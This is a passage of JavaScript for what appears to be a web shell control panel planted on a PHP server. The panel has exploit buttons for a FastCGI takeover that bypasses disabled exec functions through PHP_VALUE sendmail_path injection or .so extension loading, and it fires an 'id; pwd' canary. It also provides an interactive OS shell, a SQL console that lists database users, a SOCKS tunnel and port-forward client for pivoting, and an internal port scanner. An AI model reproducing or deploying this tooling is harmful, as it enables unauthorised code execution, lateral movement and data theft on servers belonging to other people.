      const o = document.createElement('option');
      o.value = e.ep;
      o.textContent = e.ep + (e.info ? ' (' + e.info + ')' : '');
      sel.appendChild(o);
    });
    sel.addEventListener('change', () => { this.ep = sel.value; });
    row.appendChild(sel);

    // Technique T1 — pure ini injection, no target-side artifact needed.
    const b1 = document.createElement('button');
    b1.type = 'button';
    b1.className = 'btn btn-sm btn-secondary';
    b1.textContent = 'Exploit: sendmail_path + mail()';
    b1.addEventListener('click', () => this.exploit('t1'));
    row.appendChild(b1);

    // Technique T2 — needs an ABI-matched module path on the target.
    const so = document.createElement('input');
    so.id = 'bypass-so';
    so.type = 'text';
    so.placeholder = '/path/to/poc_ext.so (ABI-matched, optional)';
    so.style.cssText = 'background:transparent;color:inherit;border:1px solid var(--border);border-radius:6px;padding:3px 6px;font-size:12px;width:260px';
    row.appendChild(so);

    const b2 = document.createElement('button');
    b2.type = 'button';
    b2.className = 'btn btn-sm btn-secondary';
    b2.textContent = 'Exploit: load extension (.so)';
    b2.addEventListener('click', () => this.exploit('t2'));
    row.appendChild(b2);

    panel.appendChild(row);
    data.endpoints.forEach(e =>
      this.out('out', '[bypass] endpoint: ' + e.ep + '  — identified via ' + e.method + (e.info ? ' (' + e.info + ')' : '')));
  },

  exploit(tech, restoring = false) {
    if (this.busy) return Promise.resolve(false);
    this.busy = true;
    const soEl = document.getElementById('bypass-so');
    if (!restoring) this.so = soEl ? soEl.value.trim() : '';
    streamSep('os-shell-output');
    this.out('cmd', '[bypass] ' + (restoring ? 're-validating' : 'technique') + ' ' + tech.toUpperCase()
      + (restoring ? '' : ' — ' + (tech === 't1'
          ? 'PHP_VALUE sendmail_path + mail()/error_log() trigger'
          : 'PHP_ADMIN_VALUE extension loading (native poc_exec)')));
    if (tech === 't2' && !this.so) {
      this.out('err', '[bypass] T2 needs the path to an ABI-matched poc_ext.so on the target (upload it via Files first)');
      this.busy = false;
      return Promise.resolve(false);
    }
    this.out('out', '[*] probing ' + this.ep + ' ...');
    const fd = new FormData();
    fd.append('action', 'bypass');
    fd.append('mode', 'probe');
    fd.append('ep', this.ep);
    return fetchJSON(fd)
      .then(pr => {
        if (!pr.ok) { this.out('err', '[!] probe failed: ' + (pr.error || 'unknown')); throw 0; }
        this.out('out', '    worker: PHP ' + pr.php + ' zts=' + (pr.zts ? 1 : 0) + ' uid=' + pr.uid);
        this.out('out', '    ini injection: ' + (pr.injection ? 'WORKS' : 'DOES NOT WORK'));
        this.out('out', '    triggers: mail()=' + (pr.mail ? 'yes' : 'no') + ' error_log()=' + (pr.error_log ? 'yes' : 'no'));
        if (!pr.injection) { this.out('err', '[!] per-request ini injection not honored — technique unavailable'); throw 0; }
        if (tech === 't1' && !pr.mail && !pr.error_log) { this.out('err', '[!] no trigger function available — T1 unavailable'); throw 0; }
        // Canary run proves execution end-to-end (command + output + cleanup).
        this.out('out', '[*] firing canary (id; pwd) ...');
        const rf = new FormData();
        rf.append('action', 'bypass');
        rf.append('mode', 'run');
        rf.append('tech', tech);
        rf.append('ep', this.ep);
        rf.append('so', this.so);
        rf.append('cmd', 'id; pwd');
        rf.append('timeout', '60');
        rf.append('cwd', document.getElementById('os-shell-prompt').textContent.replace(/ \$$/, '') || '.');
        return fetchJSON(rf);
      })
      .then(rr => {
        if (!rr || !rr.available) {
          this.out('err', '[!] exploit failed: ' + ((rr && rr.error) || 'no output'));
          throw 0;
        }
        (rr.output || '').split('\n').forEach(l => this.out('out', '    ' + l));
        this.out('out', '[+] ' + (rr.cleanup_verified ? 'worker ini restored (cleanup verified)' : 'warning: cleanup not verified'));
        this.out('out', '[+] ' + (restoring ? 'PREVIOUS SESSION RESTORED — OS shell re-enabled via '
          : 'EXPLOIT SUCCESSFUL — OS shell enabled via ') + rr.method);
        this.tech = tech;
        this.saveState();
        this.enableShell(rr.method, rr.cwd);
        return true;
      })
      .catch(e => {
        if (e !== 0) this.out('err', '[!] request failed: ' + String(e && e.message || e));
        return false;
      })
      .finally(() => { this.busy = false; });
  },

  // Re-enable the OS shell input, routing commands through the bypass.
  enableShell(method, cwd) {
    const status = document.getElementById('os-shell-status');
    const input = document.getElementById('os-shell-input');
    const prompt = document.getElementById('os-shell-prompt');
    if (cwd) { shellCwd = cwd; }
    status.innerHTML = '<span class="badge badge-ok">&#x2714; OS shell via <b>' + escHtml(method) + '</b> (FastCGI bypass)</span>';
    input.disabled = false;
    prompt.textContent = shellCwd + ' $';
    input.placeholder = 'shell command (via FastCGI bypass)  ·  Enter runs  ·  Shift+Enter newline  ·  ↑/↓ history  ·  Ctrl+L clear';
    const panel = document.getElementById('bypass-panel');
    if (panel) panel.hidden = true;   // collapse — exploit buttons return after reload
    shellAvailable = true;
    shellMethod = method;
    Terminal.bind({
      id:             'shell',
      displayName:    'Shell',
      prompt:         '$',
      contPrompt:     ' ',
      hintsLabel:     null,
      snippets:       [],
      outputEl:       'os-shell-output',
      inputEl:        'os-shell-input',
      snippetEl:      'shell-snippet-buttons',
      downloadPrefix: 'os-shell',
      historyMarker:  '$ ',
      runAction:      'bypass',
      codeField:      'cmd',
      timeoutField:   'timeout',
      timeoutValue:   '30',
      gate:           () => shellAvailable,
      echoPrefix:     () => shellCwd + ' $',
      beforeRun:      (fd) => {
        fd.append('mode', 'run');
        fd.append('tech', Bypass.tech);
        fd.append('ep', Bypass.ep);
        if (Bypass.tech === 't2') fd.append('so', Bypass.so);
        fd.append('cwd', shellCwd);
      },
      afterRun:       (data) => {
        if (data.cwd) {
          shellCwd = data.cwd;
          document.getElementById('os-shell-prompt').textContent = shellCwd + ' $';
        }
        if (data.truncated) {
          streamAppend('os-shell-output', 'err', '[output truncated — exceeded 5MB limit]');
        }
        if (data.available && !data.cleanup_verified) {
          streamAppend('os-shell-output', 'err', '[warning] worker cleanup not verified on this command');
        }
      },
    });
    input.focus();
  },
};

window.Bypass = Bypass;


// ==================== OS SHELL ADAPTER ====================
// Wraps the engine for a host-OS-shell card. Today: bash via probed exec
// function. Future: PowerShell on Windows targets, /bin/sh on macOS, etc.
// — would extend probeShell + adapter config rather than duplicate this file.

let shellAvailable = false;
let shellMethod = '';
let shellCwd = '';

function probeShell() {
  const card = document.getElementById('os-shell-card');
  const status = document.getElementById('os-shell-status');
  const fd = new FormData();
  fd.append('action', 'shell');
  fd.append('cmd', '');

  fetchJSON(fd)
    .then(data => {
      if (data.available) {
        shellAvailable = true;
        shellMethod = data.method;
        shellCwd = data.cwd;
        card.classList.remove('is-hidden');
        status.innerHTML = '<span class="badge badge-ok">&#x2714; OS shell via <b>' + escHtml(shellMethod) + '()</b></span>';
        document.getElementById('os-shell-prompt').textContent = shellCwd + ' $';
        document.getElementById('os-shell-input').placeholder = 'shell command  ·  Enter runs  ·  Shift+Enter newline  ·  ↑/↓ history  ·  Ctrl+L clear';

        // Wire the engine only after the probe confirms the shell is usable.
        // Otherwise we'd bind keydown/history to an input the operator can't
        // type into, and ↑/↓ would silently swallow keys.
        Terminal.bind({
          id:             'shell',
          displayName:    'Shell',
          prompt:         '$',                  // overridden by echoPrefix per-call
          contPrompt:     ' ',
          hintsLabel:     null,                 // no shell snippets today
          snippets:       [],
          outputEl:       'os-shell-output',
          inputEl:        'os-shell-input',
          snippetEl:      'shell-snippet-buttons',
          downloadPrefix: 'os-shell',
          historyMarker:  '$ ',                 // legacy: shell entries prefixed in shared history store
          runAction:      'shell',
          codeField:      'cmd',
          timeoutField:   'timeout',
          timeoutValue:   '30',
          gate:           () => shellAvailable,
          echoPrefix:     () => shellCwd + ' $',
          beforeRun:      (fd) => fd.append('cwd', shellCwd),
          afterRun:       (data) => {
            if (data.cwd) {
              shellCwd = data.cwd;
              document.getElementById('os-shell-prompt').textContent = shellCwd + ' $';
            }
            if (data.truncated) {
              Terminal.streamAppend('os-shell-output', 'err', '[output truncated — exceeded 5MB limit]');
            }
          },
        });
      } else {
        card.classList.remove('is-hidden');
        if (window.Bypass) {
          // Exec is disabled but the FastCGI takeover module is present —
          // offer the exploit panel instead of a dead input.
          status.innerHTML = '<span class="badge badge-no">&#x2716; exec disabled</span> <span class="badge badge-ok">FastCGI takeover available</span>';
          Bypass.show();
        } else {
          status.innerHTML = '<span class="badge badge-no">&#x2716; No exec function available</span>';
        }
        document.getElementById('os-shell-input').disabled = true;
        document.getElementById('os-shell-input').placeholder = window.Bypass
          ? 'OS shell disabled — run a FastCGI takeover exploit below to enable it'
          : 'OS shell unavailable — all exec functions are disabled';
      }
    })
    .catch(() => {
      card.classList.remove('is-hidden');
      status.innerHTML = '<span class="badge badge-no">&#x2716; Probe failed</span>';
      // Without bind() we'd leave a live-looking input that silently swallows
      // every key — disable it and tell the operator how to recover.
      document.getElementById('os-shell-input').disabled = true;
      document.getElementById('os-shell-input').placeholder = 'OS shell probe failed — reload the page to retry';
    });
}

// Probe on load — wrap so a malformed probe response can't abort the bundle.
try { probeShell(); } catch (e) { console.warn('probeShell failed:', e); }


// ==================== SQL SHELL ADAPTER ====================
// MySQL and PostgreSQL interactive shell using mysqli / PDO.
// Connection params (host, port, db, user, password) are collected from the
// settings panel and injected per-request via beforeRun — no server-side
// session needed.

var sqlAvailable    = {};   // { mysqli, pdo_mysql, pdo_pgsql } from probe
var sqlConnected    = false;
var sqlCurrentLabel = '';   // shown in the dynamic prompt

function probeSQL() {
  var fd = new FormData();
  fd.append('action', 'sql_probe');
  fetchJSON(fd)
    .then(function(data) {
      sqlAvailable = data;
      var hasMysql  = data.mysqli || data.pdo_mysql;
      var hasPgsql  = data.pdo_pgsql;
      var status    = document.getElementById('sql-status');
      if (!hasMysql && !hasPgsql) {
        if (status) status.innerHTML = '<span class="badge badge-no">&#x2716; No SQL driver (mysqli/pdo_mysql/pdo_pgsql)</span>';
        var inp = document.getElementById('sql-input');
        if (inp) { inp.disabled = true; inp.placeholder = 'No SQL extension available'; }
      } else {
        var parts = [];
        if (hasMysql)  parts.push('MySQL');
        if (hasPgsql)  parts.push('PostgreSQL');
        if (status) status.innerHTML = '<span class="badge badge-warn">&#x25CB; ' + escHtml(parts.join(', ')) + ' — not connected</span>';
        _bindSQLTerminal();
      }
    })
    .catch(function() {
      var status = document.getElementById('sql-status');
      if (status) status.innerHTML = '<span class="badge badge-no">&#x2716; Probe failed</span>';
    });
}

function sqlToggleSettings() {
  var panel = document.getElementById('sql-settings-panel');
  var btn   = document.querySelector('[aria-controls="sql-settings-panel"]');
  if (!panel) return;
  var hidden = panel.hasAttribute('hidden');
  if (hidden) { panel.removeAttribute('hidden'); } else { panel.setAttribute('hidden', ''); }
  if (btn) btn.setAttribute('aria-expanded', hidden ? 'true' : 'false');
}

// Update port default when driver type changes
function sqlDriverChange() {
  var driver = document.getElementById('sql-driver');
  var port   = document.getElementById('sql-port');
  if (!driver || !port) return;
  var defaults = { mysql: '3306', pgsql: '5432' };
  var current  = port.value.trim();
  // Only auto-fill if field is empty or holds a known default
  if (current === '' || current === '3306' || current === '5432') {
    port.value = defaults[driver.value] || '';
  }
}

function sqlConnect() {
  var host = (document.getElementById('sql-host')     || {}).value || '';
  var port = (document.getElementById('sql-port')     || {}).value || '';
  var db   = (document.getElementById('sql-db')       || {}).value || '';
  var user = (document.getElementById('sql-user')     || {}).value || '';
  var pass = (document.getElementById('sql-password') || {}).value || '';
  var drv  = (document.getElementById('sql-driver')   || {}).value || 'mysql';
  var statusEl = document.getElementById('sql-connect-status');
  var badgeEl  = document.getElementById('sql-status');

  if (!host) { if (statusEl) statusEl.textContent = 'Host required'; return; }

  if (statusEl) statusEl.innerHTML = '<span style="color:var(--muted)">Connecting\u2026</span>';

  var fd = new FormData();
  fd.append('action',   'sql_query');
  fd.append('query',    'SELECT 1');
  fd.append('host',     host.trim());
  fd.append('port',     port.trim());
  fd.append('db',       db.trim());
  fd.append('user',     user.trim());
  fd.append('password', pass);
  fd.append('driver',   drv);
  fd.append('timeout',  '10');

  fetchJSON(fd)
    .then(function(data) {
      if (data.error) {
        sqlConnected = false;
        if (statusEl) statusEl.innerHTML = '<span class="badge badge-no">&#x2716; ' + escHtml(data.error) + '</span>';
        if (badgeEl)  badgeEl.innerHTML  = '<span class="badge badge-no">&#x2716; Not connected</span>';
        return;
      }
      sqlConnected    = true;
      sqlCurrentLabel = drv + '@' + host.trim() + (db.trim() ? '/' + db.trim() : '');
      if (statusEl) statusEl.innerHTML = '<span class="badge badge-ok">&#x2714; Connected</span>';
      if (badgeEl)  badgeEl.innerHTML  = '<span class="badge badge-ok">&#x2714; ' + escHtml(sqlCurrentLabel) + '</span>';
      // Close settings panel after successful connect
      var panel = document.getElementById('sql-settings-panel');
      if (panel) { panel.setAttribute('hidden', ''); }
      var btn = document.querySelector('[aria-controls="sql-settings-panel"]');
      if (btn) btn.setAttribute('aria-expanded', 'false');
      // Focus input for immediate use
      var inp = document.getElementById('sql-input');
      if (inp) inp.focus();
    })
    .catch(function(err) {
      sqlConnected = false;
      if (statusEl) statusEl.innerHTML = '<span class="badge badge-no">&#x2716; ' + escHtml(String(err)) + '</span>';
    });
}

function sqlRenderTable(streamId, columns, rows, count, truncated) {
  var el = document.getElementById(streamId);
  if (!el) return;
  var wasAtBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 24;

  var wrap = document.createElement('div');
  wrap.className = 'stream-out sql-result-wrap';

  if (!columns || columns.length === 0) {
    wrap.textContent = '(empty result)';
    el.appendChild(wrap);
    if (wasAtBottom) el.scrollTop = el.scrollHeight;
    return;
  }

  var table = document.createElement('table');
  table.className = 'file-table';

  var thead = document.createElement('thead');
  var hrow  = document.createElement('tr');
  columns.forEach(function(col) {
    var th = document.createElement('th');
    th.textContent = col;
    hrow.appendChild(th);
  });
  thead.appendChild(hrow);
  table.appendChild(thead);

  var tbody = document.createElement('tbody');
  (rows || []).forEach(function(row) {
    var tr = document.createElement('tr');
    row.forEach(function(cell) {
      var td = document.createElement('td');
      td.title = cell;
      td.textContent = cell;
      tr.appendChild(td);
    });
    tbody.appendChild(tr);
  });
  table.appendChild(tbody);
  wrap.appendChild(table);

  var meta = document.createElement('div');
  meta.className = 'sql-result-meta';
  meta.textContent = count + ' row' + (count !== 1 ? 's' : '') + (truncated ? ' (truncated — 500 row limit)' : '');
  wrap.appendChild(meta);

  el.appendChild(wrap);
  if (wasAtBottom) el.scrollTop = el.scrollHeight;
}

function _bindSQLTerminal() {
  Terminal.bind({
    id:             'sql',
    displayName:    'SQL',
    prompt:         'sql>',
    contPrompt:     '    ',
    hintsLabel:     'snippets',
    snippets: [
      ['version',    'SELECT VERSION();'],
      ['tables',     'SHOW TABLES;'],
      ['databases',  'SHOW DATABASES;'],
      ['users',      'SELECT user, host FROM mysql.user;'],
      ['processlist','SHOW PROCESSLIST;'],
    ],
    outputEl:       'sql-output',
    inputEl:        'sql-input',
    snippetEl:      'sql-snippet-buttons',
    downloadPrefix: 'sql-query',
    historyMarker:  'sql> ',
    excludeMarkers: ['$ ', ''],
    runAction:      'sql_query',
    codeField:      'query',
    timeoutField:   'timeout',
    timeoutValue:   '30',
    gate:           function() { return sqlConnected; },
    echoPrefix:     function() { return sqlCurrentLabel + '>'; },
    beforeRun: function(fd) {
      fd.append('host',     (document.getElementById('sql-host')     || {value:''}).value.trim());
      fd.append('port',     (document.getElementById('sql-port')     || {value:''}).value.trim());
      fd.append('db',       (document.getElementById('sql-db')       || {value:''}).value.trim());
      fd.append('user',     (document.getElementById('sql-user')     || {value:''}).value.trim());
      fd.append('password', (document.getElementById('sql-password') || {value:''}).value);
      fd.append('driver',   (document.getElementById('sql-driver')   || {value:'mysql'}).value);
    },
    afterRun: function(data) {
      // The engine emits "(no output)" when data.output is empty — remove it
      // before we render the actual SQL result below.
      var streamEl = document.getElementById('sql-output');
      if (streamEl) {
        var last = streamEl.lastElementChild;
        if (last && last.textContent === '(no output)') last.parentNode.removeChild(last);
      }
      if (data.columns != null) {
        sqlRenderTable('sql-output', data.columns, data.rows, data.count, data.truncated);
      } else if (data.affected != null) {
        streamAppend('sql-output', 'out', 'Query OK, ' + data.affected + ' row(s) affected');
      }
    },
  });
}

try { probeSQL(); } catch (e) { console.warn('probeSQL failed:', e); }


// ==================== TUNNEL ====================
(function() {
  const urlEl = document.getElementById('tunnel-url');
  const cmdEl = document.getElementById('tunnel-cmd');
  const cmdFwdEl = document.getElementById('tunnel-cmd-fwd');
  if (urlEl) {
    const tunnelUrl = location.origin + location.pathname;
    urlEl.value = tunnelUrl;
    cmdEl.textContent = 'python3 webtun.py -u ' + tunnelUrl + ' -k <password> --socks 1080';
    if (cmdFwdEl) cmdFwdEl.textContent = '# Port forward: python3 webtun.py -u ' + tunnelUrl + ' -k <password> -L 3306:10.0.0.5:3306';
  }
})();

function tunnelRefresh() {
  tunnelCheck();
  tunnelLoadSessions();
}

function tunnelLoadSessions() {
  var el = document.getElementById('tunnel-sessions');
  if (!el) return;
  // Send raw POST with X-WT header (bypasses normal action dispatch, caught by TUNNEL_GUARD)
  fetch(BASE_URL, { method: 'POST', headers: { 'X-WT': 'status' } })
    .then(function(r) { return r.json(); })
    .then(function(d) {
    if (!d.sessions || d.sessions.length === 0) {
      el.innerHTML = '<div style="color:var(--muted);font-size:13px">No active tunnel sessions. Start tunnel from Python client.</div>';
      document.getElementById('tunnel-status').innerHTML = '<span style="color:var(--muted)">Idle</span>';
      return;
    }
    var html = '';
    d.sessions.forEach(function(s) {
      var alive = s.last_active && (Math.floor(Date.now() / 1000) - s.last_active) < 60;
      var color = alive ? 'var(--green)' : (s.status === 'closed' ? 'var(--red)' : 'var(--yellow)');
      var statusText = alive ? 'ACTIVE' : (s.status === 'closed' ? 'CLOSED' : 'STALE');
      var elapsed = Math.floor(Date.now() / 1000) - (s.created_at || 0);
      var stats = s.stats || {};
      html += '<div style="padding:10px;margin-bottom:8px;background:rgba(0,0,0,.2);border-radius:6px;border:1px solid var(--border)">';
      html += '<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">';
      html += '<span style="color:' + color + ';font-weight:600;font-size:11px;text-transform:uppercase">' + escHtml(statusText) + '</span>';
      html += '<span style="font-family:monospace;font-size:11px;color:var(--muted)">' + escHtml(s.sid) + '</span>';
      html += '<span style="font-size:11px;color:var(--muted)">uptime: ' + elapsed + 's</span>';
      html += '</div>';
      html += '<div style="display:flex;gap:14px;font-size:12px;flex-wrap:wrap">';
      html += '<span>channels: <strong>' + (s.channels || 0) + '</strong></span>';
      html += '<span style="color:var(--green)">in: ' + (stats.bytes_in || 0) + 'B</span>';
      html += '<span style="color:var(--accent)">out: ' + (stats.bytes_out || 0) + 'B</span>';
      html += '<span style="color:var(--muted)">frames: ' + (stats.frames_in || 0) + '/' + (stats.frames_out || 0) + '</span>';
      html += '</div></div>';
    });
    el.innerHTML = html;
    var activeCount = d.sessions.filter(function(s) { return s.status === 'active' && s.last_active && (Math.floor(Date.now() / 1000) - s.last_active) < 60; }).length;
    var statusEl = document.getElementById('tunnel-status');
    if (activeCount > 0) {
      statusEl.innerHTML = '<span style="color:var(--green)">' + activeCount + ' active</span>';
    } else {
      statusEl.innerHTML = '<span style="color:var(--muted)">Idle</span>';
    }
  }).catch(function() {});
}

function tunnelCheck() {
  var resultEl = document.getElementById('tunnel-test-result');
  var reqsEl = document.getElementById('tunnel-reqs');
  var statusEl = document.getElementById('tunnel-status');
  resultEl.innerHTML = '<span class="spinner"></span> Running diagnostics...';

  var fd = new FormData();
  fd.append('action', 'diag');

  fetchJSON(fd)
    .then(function(d) {
      var funcs = d.functions || {};
      var hasSock = funcs['stream_socket_client'];
      var hasSelect = true; // stream_select is always available if stream_socket_client is
      var row = function(label, ok, detail) {
        var badge = ok ? '<span class="badge badge-ok">\u2714</span>' : '<span class="badge badge-no">\u2716</span>';
        return '<div class="diag-item"><span class="diag-label">' + label + '</span><span class="diag-value">' + badge + ' ' + escHtml(String(detail || '')) + '</span></div>';
      };
      var html = '';
      html += row('stream_socket_client', funcs['stream_socket_client'], funcs['stream_socket_client'] ? 'available' : 'disabled');
      html += row('fsockopen', funcs['fsockopen'], funcs['fsockopen'] ? 'available' : 'disabled');
      html += '<div class="diag-item"><span class="diag-label">open_basedir</span><span class="diag-value">' + escHtml(d.open_basedir) + '</span></div>';
      html += '<div class="diag-item"><span class="diag-label">max_execution_time</span><span class="diag-value">' + escHtml(String(d.max_execution_time || 'unknown')) + '</span></div>';
      reqsEl.innerHTML = html;

      if (hasSock) {
        resultEl.innerHTML = '<div style="color:var(--green)">\u2714 Socket functions available. Tunnel should work.</div>';
        if (d.max_execution_time && d.max_execution_time > 0 && d.max_execution_time < 30) {
          resultEl.innerHTML += '<div style="color:var(--yellow);font-size:11px;margin-top:4px">\u26A0 max_execution_time=' + d.max_execution_time + 's is low. Tunnel will auto-reconnect but sessions may be interrupted.</div>';
        }
      } else {
        resultEl.innerHTML = '<div style="color:var(--red)">\u2716 stream_socket_client not available. Tunnel will not work on this host.</div>';
      }

      tunnelLoadSessions();
    })
    .catch(function(err) {
      resultEl.innerHTML = '<div style="color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    });
}


// ==================== PORT SCANNER ====================
const SCAN_POLL_MS = 1500;
const _scanPollers = {}; // scanId -> { running, timer }
const _scanPollGen = {}; // scanId -> generation (bump on destroy)
let _scanRendering = false;
let _scanRenderPending = false;

const _SCAN_TERMINAL = { paused: 1, stopped: 1, done: 1 };

function _scanMergeStatus(localStatus, remoteStatus) {
  if (_SCAN_TERMINAL[localStatus] && remoteStatus === 'running') return localStatus;
  return remoteStatus;
}

// Port presets — each one is a careful merge of Nmap's frequency-ranked set
// (2008 public-internet survey, https://github.com/nmap/nmap/blob/master/nmap-services)
// with the modern cloud/container/DevOps stack (docker, k8s, etcd, redis,
// mongo, ES, brokers, observability, WinRM, WireGuard, etc).
const SCAN_PORT_PRESETS = {
  tcp_small:  { proto: 'tcp', ports: '21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,2222,3000,3306,3389,5432,5900,5985,5986,6379,6443,8080,8443,9200,27017' },
  tcp_common: { proto: 'tcp', ports: '7,9,13,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,119,135,139,143,144,179,199,389,427,443,444,445,465,513,514,515,543,544,548,554,587,631,646,873,990,993,995,1025,1026,1027,1028,1029,1110,1433,1720,1723,1755,1883,1900,1935,2000,2001,2049,2121,2222,2375,2376,2379,2380,2717,3000,3128,3306,3389,3986,4222,4443,4899,5000,5001,5009,5044,5051,5060,5101,5190,5357,5432,5601,5631,5666,5672,5800,5900,5985,5986,6000,6001,6379,6443,6646,7070,7474,7687,8000,8001,8008,8009,8080,8081,8086,8443,8554,8883,8888,9000,9090,9092,9100,9200,9300,9443,9870,9999,10000,10250,10255,11211,15672,27017,27018,32768,49152,49153,49154,49155,49156,49157' },
  tcp_all:    { proto: 'tcp', ports: '1-65535' },
  udp_small:  { proto: 'udp', ports: '53,67,68,123,135,137,138,139,161,445,500,520,631,1434,1900,4500,5353,51820' },
  udp_common: { proto: 'udp', ports: '7,53,67,68,69,80,111,123,135,136,137,138,139,161,162,445,500,514,518,520,593,626,631,996,997,998,999,1025,1026,1027,1433,1434,1645,1646,1701,1812,1900,2048,2049,2222,3283,3456,4500,5060,5353,20031,32768,49152,49153,49154,51820' },
  udp_all:    { proto: 'udp', ports: '1-1024' },
};

function scanFillPorts(preset) {
  const p = SCAN_PORT_PRESETS[preset];
  if (!p) return;
  document.getElementById('scan-ports').value = p.ports;
  document.getElementById('scan-proto').value = p.proto;
}

function scanStart() {
  const targets = document.getElementById('scan-targets').value.trim();
  const ports   = document.getElementById('scan-ports').value.trim();
  if (!targets || !ports) { alert('Targets and ports are required.'); return; }
  const proto = document.getElementById('scan-proto').value;
  const concurrency = parseInt(document.getElementById('scan-concurrency').value, 10) || 64;
  const timeout_ms  = parseInt(document.getElementById('scan-timeout').value, 10) || 800;
  const batch_ms    = parseInt(document.getElementById('scan-batch').value, 10) || 1500;
  const fingerprint = document.getElementById('scan-fingerprint').checked ? '1' : '';

  const btn = document.getElementById('scan-start-btn');
  btn.disabled = true; btn.textContent = 'Starting...';

  const fd = new FormData();
  fd.append('action', 'scan_start');
  fd.append('targets', targets);
  fd.append('ports', ports);
  fd.append('proto', proto);
  fd.append('concurrency', concurrency);
  fd.append('timeout_ms', timeout_ms);
  fd.append('batch_ms', batch_ms);
  if (fingerprint) fd.append('fingerprint', '1');

  fetchJSON(fd).then(d => {
    btn.disabled = false; btn.textContent = '▶ Start Scan';
    if (d.error) { alert('Start failed: ' + d.error); return; }
    const scan = {
      id: d.id,
      status: 'running',
      started_at: Math.floor(Date.now() / 1000),
      finished_at: null,
      total: d.total,
      cursor: 0,
      summary: { open: 0, closed: 0, filtered: 0 },
      next_offset: 0,
      opts: { targets_str: targets, ports_str: ports, proto, concurrency, timeout_ms, batch_ms, fingerprint: !!fingerprint },
      host_count: d.host_count,
      port_count: d.port_count,
    };
    dbPut('scans', scan).then(() => {
      renderScans();
      scanStartPoller(scan.id);
    });
  }).catch(err => {
    btn.disabled = false; btn.textContent = '▶ Start Scan';
    alert('Network error: ' + err);
  });
}

function scanControl(id, action) {
  // Stopping is a client-side state change from now on as far as history is
  // concerned: the server removes a stopped/finished scan's progress files
  // immediately, and this localStorage marker distinguishes "I stopped this"
  // from "it completed" after a reload
  if (action === 'stop') {
    try { localStorage.setItem('sx.scan_stopped.' + id, String(Date.now())); } catch (e) {}
  } else if (action === 'resume') {
    try { localStorage.removeItem('sx.scan_stopped.' + id); } catch (e) {}
  }
  const fd = new FormData();
  fd.append('action', 'scan_' + action);
  fd.append('id', id);
  return fetchJSON(fd).then(d => {
    if (d.error) { alert(action + ' failed: ' + d.error); return; }
    return dbOpen().then(db => new Promise(res => {
      const tx = db.transaction('scans', 'readwrite');
      const os = tx.objectStore('scans');
      const g = os.get(id);
      g.onsuccess = () => {
        const s = g.result;
        if (s) {
          s.status = d.status || s.status;
          if (s.status === 'stopped' || s.status === 'done') s.finished_at = Math.floor(Date.now() / 1000);
          os.put(s);
        }
        res();
      };
    })).then(() => {
      if (action === 'pause' || action === 'stop') scanStopPoller(id);
      if (action === 'resume') scanStartPoller(id);
      updateScanCard(id);
    });
  });
}

function scanDestroy(id) {
  if (!confirm('Delete this scan and all its results?')) return;
  _scanPollGen[id] = (_scanPollGen[id] || 0) + 1;
  scanStopPoller(id);
  const fd = new FormData();
  fd.append('action', 'scan_destroy');
  fd.append('id', id);
  fetchJSON(fd).finally(() => {
    Promise.all([
      dbDelete('scans', id),
      dbDeleteByIndex('scan_results', 'by_scan', id),
    ]).then(renderScans);
  });
}

function scanStartPoller(id) {
  if (_scanPollers[id]) return;
  const p = { running: true, timer: null };
  _scanPollers[id] = p;
  const tick = () => {
    if (!p.running) return;
    scanPollOnce(id).catch(() => {}).then(() => {
      // Self-reschedule only after the previous poll's IDB writes have committed.
      // Using setInterval here would let polls overlap on slow batches and
      // re-fetch the same byte range with stale next_offset, duplicating events.
      if (p.running) p.timer = setTimeout(tick, SCAN_POLL_MS);
    });
  };
  tick();
}

function scanStopPoller(id) {
  const p = _scanPollers[id];
  if (!p) return;
  p.running = false;
  if (p.timer) clearTimeout(p.timer);
  delete _scanPollers[id];
}

function scanPollOnce(id) {
  const gen = _scanPollGen[id] || 0;
  return dbOpen().then(db => new Promise(res => {
    const g = db.transaction('scans', 'readonly').objectStore('scans').get(id);
    g.onsuccess = () => res(g.result);
  })).then(scan => {
    if (!scan || (_scanPollGen[id] || 0) !== gen) { scanStopPoller(id); return; }
    const fd = new FormData();
    fd.append('action', 'scan_poll');
    fd.append('id', id);
    fd.append('since', scan.next_offset || 0);
    return fetchJSON(fd).then(d => {
      if ((_scanPollGen[id] || 0) !== gen) return;
      if (d.error) {
        // Scan vanished server-side (e.g. /tmp GC) — stop polling
        scanStopPoller(id);
        return;
      }
      const events = d.events || [];
      const rows = events.map(ev => Object.assign({ scan_id: id }, ev));
      const putResults = rows.length ? dbPutMany('scan_results', rows) : Promise.resolve();
      return putResults.then(() => dbOpen()).then(db => new Promise(res2 => {
        const tx = db.transaction('scans', 'readwrite');
        const os = tx.objectStore('scans');
        const g2 = os.get(id);
        g2.onsuccess = () => {
          const s = g2.result;
          if (s) {
            s.status      = _scanMergeStatus(s.status, d.state.status);
            s.cursor      = d.state.cursor;
            s.total       = d.state.total;
            s.summary     = d.state.summary;
            s.finished_at = d.state.finished_at;
            s.next_offset = d.next_offset;
            os.put(s);
          }
          tx.oncomplete = () => res2(s);
        };
      })).then(s => {
        if ((_scanPollGen[id] || 0) !== gen) return;
        if (s && (s.status === 'done' || s.status === 'stopped')) scanStopPoller(id);
        updateScanCard(id);
      });
    }).catch(() => { /* transient network error — keep polling */ });
  });
}

function scanReattach() {
  // On load: find scans in IDB with status=running, restart their pollers.
  // Also sync with server to catch scans started in another tab. Note the
  // server only knows LIVE scans now — completed scans persist in IDB alone
  // and won't appear on a browser that never saw them (by design).
  dbGetAll('scans')
    .then(scans => { scans.forEach(s => { if (s.status === 'running') scanStartPoller(s.id); }); })
    .catch(err => console.warn('scan reattach (local) failed:', err))
    .then(renderScans);
  const fd = new FormData();
  fd.append('action', 'scan_list');
  fetchJSON(fd).then(d => {
    if (!d || !d.scans) return;
    return dbGetAll('scans').then(local => {
      const known = new Set(local.map(s => s.id));
      const toAdd = d.scans.filter(s => !known.has(s.id)).map(s => Object.assign({}, s, { next_offset: 0 }));
      if (toAdd.length) {
        return dbPutMany('scans', toAdd).then(() => {
          toAdd.forEach(s => { if (s.status === 'running') scanStartPoller(s.id); });
          renderScans();
        });
      }
    });
  }).catch(err => console.warn('scan reattach (server) failed:', err));
}

function renderScans() {
  if (_scanRendering) {
    _scanRenderPending = true;
    return;
  }
  _scanRendering = true;
  const body = document.getElementById('scans-body');
  if (!body) {
    _scanRendering = false;
